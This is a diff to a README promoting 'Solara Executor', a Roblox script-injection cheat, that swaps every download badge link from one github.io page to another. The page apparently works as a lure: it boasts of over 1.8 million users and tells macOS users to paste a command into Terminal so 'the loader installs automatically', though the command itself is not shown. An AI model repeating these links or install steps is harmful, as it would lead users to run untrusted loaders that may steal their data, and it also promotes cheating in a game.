@@ -10,8 +10,8 @@ The **☀️ Solara Executor** delivers solar-powered script execution for Roblo
 
 <div align="center">
 
-[![Download Solara Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download Solara Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
 
 </div>
 
@@ -113,7 +113,7 @@ The **☀️ Solara Executor** delivers solar-powered script execution for Roblo
 4. **🎮 Join any Roblox game**
 5. **⚡ Click Inject** — load your script and Execute
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20SOLARA%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20SOLARA%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
 
 ### 🍎 macOS
 
@@ -121,7 +121,7 @@ The **☀️ Solara Executor** delivers solar-powered script execution for Roblo
 2. **Paste the command** (`⌘ + V`) and press Enter
 3. **Follow the prompts** — the loader installs automatically
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
 
 ---
 
@@ -180,5 +180,5 @@ New versions are typically available **within 24 hours**.
 
 Join over 1.8 million players who rely on Solara Executor for fast, transparent, keyless Roblox script execution in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20SOLARA%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20SOLARA%20🔻-purple?style=for-the-badge&logo=github)](https://beauticianblaze.github.io/DownloadWin/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beauticianblaze.github.io/DownloadMac/)
